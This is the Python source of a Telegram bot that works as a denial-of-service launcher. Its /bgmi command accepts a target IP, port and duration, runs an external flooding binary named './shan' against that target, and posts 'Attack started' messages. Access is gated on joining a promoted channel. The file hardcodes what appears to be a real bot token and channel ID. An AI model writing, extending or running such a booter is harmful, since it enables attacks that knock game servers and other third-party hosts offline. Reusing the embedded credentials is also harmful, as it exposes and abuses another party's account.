import subprocess
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from datetime import datetime, timedelta

# Bot token and channel ID
BOT_TOKEN = "8032810151:AAFxY32Kudl9vZb8in_uQHxM0QEfRtnnv_k"
CHANNEL_ID = "-1002247039181"  # Note the '-' prefix for supergroup channels

# Constants
INVALID_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030}
MAX_TIME = 120
COOLDOWN_PERIOD = timedelta(minutes=5)
thread = "2"
# Global variable to track the last attack time for cooldown
last_attack_time = {}



async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Check if the user is a member of the required channel
    if not await is_user_in_channel(user_id, context):
        await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙟𝙤𝙞𝙣 𝙩𝙝𝙚 𝙘𝙝𝙖𝙣𝙣𝙚𝙡 𝙛𝙤𝙧 𝙖𝙘𝙘𝙚𝙨𝙨 𝙩𝙤 𝙩𝙝𝙚 𝙗𝙤𝙩. 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙡𝙞𝙣𝙠 - https://t.me/+Edf2t3u9ifEzZmRl")
        return

    # Ensure correct number of arguments
    if len(context.args) != 3:
        await update.message.reply_text("𝙐𝙨𝙖𝙜𝙚: /bgmi <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚>")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Check if the user is a member of the required channel
    if not await is_user_in_channel(user_id, context):
        await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙟𝙤𝙞𝙣 𝙩𝙝𝙚 𝙘𝙝𝙖𝙣𝙣𝙚𝙡 𝙛𝙤𝙧 𝙖𝙘𝙘𝙚𝙨𝙨 𝙩𝙤 𝙩𝙝𝙚 𝙗𝙤𝙩. 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙡𝙞𝙣𝙠 - https://t.me/+Edf2t3u9ifEzZmRl")
        return

    # Ensure correct number of arguments
    if len(context.args) != 3:
        await update.message.reply_text("𝙐𝙨𝙖𝙜𝙚: /bgmi <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚>")
        return

    ip, port, time_str = context.args

    # Check if port is valid
    try:
        port = int(port)
    except ValueError:
        await update.message.reply_text("𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙥𝙤𝙧𝙩. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙚𝙣𝙩𝙚𝙧 𝙖 𝙣𝙪𝙢𝙚𝙧𝙞𝙘 𝙥𝙤𝙧𝙩.")
        return

    if port in INVALID_PORTS:
        await update.message.reply_text("𝙏𝙝𝙚𝙨𝙚 𝙥𝙤𝙧𝙩𝙨 𝙖𝙧𝙚 𝙬𝙧𝙤𝙣𝙜. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙤𝙫𝙞𝙙𝙚 𝙩𝙝𝙚 𝙘𝙤𝙧𝙧𝙚𝙘𝙩 𝙥𝙤𝙧𝙩 𝙖𝙣𝙙 𝙄𝙋.")
        return

    # Check if time is valid
    try:
        time_sec = int(time_str)
    except ValueError:
        await update.message.reply_text("𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙩𝙞𝙢𝙚. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙚𝙣𝙩𝙚𝙧 𝙖 𝙣𝙪𝙢𝙚𝙧𝙞𝙘 𝙩𝙞𝙢𝙚 𝙞𝙣 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.")
        return

    if time_sec > MAX_TIME:
        await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙥𝙪𝙩 𝙩𝙞𝙢𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 120 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.")
        return

    # Check cooldown for user
    now = datetime.now()
    if user_id in last_attack_time:
        time_since_last_attack = now - last_attack_time[user_id]
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_time = COOLDOWN_PERIOD - time_since_last_attack
            await update.message.reply_text(f"𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙩𝙝𝙚 5-𝙢𝙞𝙣𝙪𝙩𝙚 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝙩𝙞𝙢𝙚: {remaining_time} ")
            return

    # Execute the command using subprocess
    try:
        subprocess.Popen(["./shan", ip, str(port), str(time_sec), thread])
    except Exception as e:
        await update.message.reply_text(f"Failed to start attack: {e}")
        return

    # Send the "attack started" message
    await update.message.reply_text(
        f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣🚀\n"
        f"🎯IP = {ip}\n"
        f"🏖️Port = {port}\n"
        f"⏳Time = {time_sec} sec"
        f"𝙇𝙞𝙣𝙠 - https://t.me/+Edf2t3u9ifEzZmRl")

    # Record the attack time for cooldown tracking
    last_attack_time[user_id] = now

    # Schedule message for attack completion
    context.job_queue.run_once(
        send_attack_complete_message, time_sec, context=update.message.chat_id
    )

async def send_attack_complete_message(context: ContextTypes.DEFAULT_TYPE):
    chat_id = context.job.context
    await context.bot.send_message(
        chat_id=chat_id,
        text="🚀 A̷̷t̷̷t̷a̷̷c̷̷k̷ ̷o̷̷v̷̷e̷̷r̷ ̷o̷̷n 🚀𝙇𝙞𝙣𝙠 - https://t.me/+Edf2t3u9ifEzZmRl"
    )

async def is_user_in_channel(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        member_status = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        return member_status.status in ["member", "administrator", "creator"]
    except Exception as e:
        return False

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Register the /bgmi command
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("start", start))
    # Run the bot
    app.run_polling()

if __name__ == "__main__":
    main()
    
